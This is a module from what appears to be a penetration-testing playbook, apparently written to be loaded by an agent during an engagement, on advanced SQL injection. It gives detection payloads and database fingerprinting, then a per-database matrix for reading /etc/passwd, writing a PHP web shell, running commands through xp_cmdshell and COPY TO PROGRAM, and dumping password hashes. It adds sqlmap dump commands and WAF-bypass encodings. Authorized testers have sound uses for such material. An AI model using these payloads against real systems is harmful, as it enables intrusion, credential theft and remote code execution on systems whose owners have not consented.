# Web And API Operations: Attack Primitives: Traditional Web Vulnerabilities: SQL Injection — Beyond The Basics

> Apply [../module-continuity.md](../module-continuity.md). Keep the same engagement and parent path as the calling route. Load this scene only when current evidence supports its prerequisites.

### SQL Injection — Beyond The Basics

#### The Practical Approach

Don't start with sqlmap. Start with manual confirmation, then use automation strategically.

**Step 1 — Find the parameter**: Every user-controlled input that might reach a database: GET/POST parameters, cookies, HTTP headers (User-Agent, Referer, X-Forwarded-For, custom headers), JSON/XML body fields, file upload names, URL path segments.

**Step 2 — Confirm the injection class with a minimal test**:

| Injection Context | Test Payload | Expected Response Difference |
|---|---|---|
| String (single-quoted) | `'` | Error, different page, or no response |
| String (double-quoted) | `"` | Same as above |
| Integer | `-1` or `0` | Different result from normal positive value |
| Boolean (WHERE clause) | `' AND '1'='1` vs `' AND '1'='2` | Content difference between true and false |
| ORDER BY / LIMIT | `1` vs `99999999` or `1 ASC` vs `1 DESC` | Different ordering or result count |
| LIKE / SEARCH | `%' AND 1=1--` vs `%' AND 1=2--` | Different result sets |
| INSERT / UPDATE | `', (SELECT ...), '` in a value field | Subquery result appears in response or error |

**Step 3 — Determine database type before exploiting**:

| Signal | Indicates |
|---|---|
| Error mentions "MySQL", "MariaDB", "mysql_fetch" | MySQL/MariaDB |
| Error mentions "PostgreSQL", "pg_", "psql" | PostgreSQL |
| Error mentions "Microsoft", "SQL Server", "ODBC SQL Server", "mssql" | MSSQL |
| Error mentions "ORA-", "PL/SQL", "Oracle" | Oracle |
| Error mentions "SQLite", "sqlite" | SQLite |
| `@@version` returns version | MSSQL, MySQL |
| `version()` returns version | MySQL, PostgreSQL, MariaDB |
| `/*!50000 ...*/` executes — versioned comment | MySQL |
| `--` vs `#` vs `;--` comment behavior | MySQL: `#` or `-- `; MSSQL: `--`; PostgreSQL: `--`; Oracle: `--` |
| String concat: `'a' \|\| 'b'` works | PostgreSQL, Oracle; MySQL needs `CONCAT()`, MSSQL uses `+` |

**Step 4 — Model the query context before exploiting**: Before using the database capability matrix, determine: what part of the query does your input occupy? (WHERE clause, SELECT column, ORDER BY, INSERT value, table name?) What is the expected output? (data rows, error message, boolean difference, time delay?) What privilege does the database user have? (file read, file write, command execution may not be available.) This model determines which exploitation path is viable — the capability matrix below maps DBMS-specific methods to each path, but the path must first be justified by the query context.

**Step 5 — Choose exploitation path by database**:

| DBMS | File Read | File Write | Command Execution | Hash Dump |
|---|---|---|---|---|
| MySQL | `LOAD_FILE('/etc/passwd')` | `SELECT ... INTO OUTFILE '/var/www/html/shell.php'` | UDF plugin (requires plugin_dir writable) | `SELECT user,authentication_string FROM mysql.user` |
| PostgreSQL | `CREATE TABLE t(c text); COPY t FROM '/etc/passwd'` | `COPY t TO '/tmp/out'` | `COPY (SELECT '') TO PROGRAM 'id'` (requires pg_execute_server_program) | `SELECT usename,passwd FROM pg_shadow` |
| MSSQL | `OPENROWSET(BULK 'C:\...')` or `xp_fileexist` | `xp_cmdshell 'echo ... > path'` | `xp_cmdshell` (disabled by default, enable via `sp_configure`), `sp_OACreate` | `SELECT name,password_hash FROM sys.sql_logins` |
| Oracle | `UTL_FILE`, external tables | `UTL_FILE` | `DBMS_SCHEDULER`, Java stored procedures | `SELECT username,password FROM dba_users` |
| SQLite | `readfile('/etc/passwd')` (requires extension) | `writefile('/tmp/x','data')` (requires extension) | `load_extension()` | Bypass auth by overwriting SQLite DB file |

**Using sqlmap tactically**: 

Don't run `sqlmap -u <url>` with default settings on a production target. Instead:
```bash
# First: confirm injection manually
# Then: targeted sqlmap with bounded risk
sqlmap -u "<url>" --dbms=<identified_dbms> --risk=2 --level=3 --technique=<B|E|U|S|T> --batch --delay=0.5 --random-agent
# Get databases
sqlmap -u "<url>" --dbs
# Dump specific table (not whole DB)
sqlmap -u "<url>" -D <database> -T <table> --dump --stop=10
# For WAF bypass: --tamper=<tamper_script>
sqlmap -u "<url>" --tamper=space2comment,charencode,randomcase --level=5
```

**WAF Bypass Patterns** (when sqlmap tampers fail):
```
space → /**/, +, %09, %0a, %0d, %0c, (comment)/**/between/**/words
AND/OR → &&, ||, &&, %26%26
UNION SELECT → UNION ALL SELECT, UNION/**/SELECT, /*!50000Union*/ Select
' or 1=1-- → ' || 1=1--, ' or 2>1--, ' or 'x'='x
```


### Failure Branches

| Failure Signal | Likely Cause | Next Variable |
|---|---|---|
| `'` returns error but UNION SELECT returns no data | The original query returns zero rows (UNION result not displayed); the SELECT column count is wrong; output encoding strips the injected result | Confirm the column count via ORDER BY 1,2,3...; test NULL concatenation to match column types; if original query returns rows but UNION output is suppressed, switch to error-based or boolean-based extraction |
| Timing-based payload causes delay but cannot distinguish database | Network latency, server load, or caching causes false-positive timing; the delay is real but too small to be reliable | Establish a baseline from the target's normal response-time distribution within the authorized test window. Choose a sleep value that exceeds baseline variance by a clear margin appropriate to the target's latency profile. Verify with a second independent timing test or an alternative blind technique before concluding |
| sqlmap reports injectable but manual verification fails | sqlmap detected an injection that requires specific conditions (cookies, headers, CSRF token); or a false positive from aggressive settings; or injection exists but output is suppressed for manual payloads | Replicate the exact sqlmap request (copy headers, cookies, and parameters); lower sqlmap level/risk and retest; if the injection only reproduces under high-risk or high-level settings, the triggers are more specific — classify as partial with the exact conditions documented |
| UNION works but no useful data in the database (empty tables, no user tables accessible) | Current database user has limited privileges; the application database is read-only or isolated; you are in a honeypot or test database | Enumerate privileges: `SELECT grantee, privilege_type FROM information_schema.user_privileges` (MySQL) or equivalent. If limited, the SQL injection is confirmed but the value is low — park the path and test: can file read/write compensate for limited DB access? |
| WAF blocks all injection attempts despite encoding variations | The WAF signature is well-tuned; or the WAF is in blocking mode rather than detection-only | Test bypasses one category at a time: HTTP parameter pollution (duplicate parameters), encoding variation (double-URL, UTF-16, IBM/Unicode mismatch), chunked transfer obfuscation, verb tampering (GET→POST). If WAF consistently blocks, park the injection path and test: does the same parameter reach a different injection sink (NoSQL, command, LDAP) that the WAF signature doesn't cover? |
| Error-based confirmed but UNION and blind both blocked → cannot extract data | The application has layered defenses: error messages are suppressed after the first error; UNION output is filtered; timing is inconsistent | Test out-of-band extraction (DNS/HTTP callback from the database). If egress is also blocked, classify as `partial` — injection confirmed, data extraction not currently possible. Park with a reactivation condition and prioritize other attack classes with higher information gain |

## Scene Exit

Return result classification, evidence, changed assumptions, affected paths, persistent changes, and the next parent-path decision.
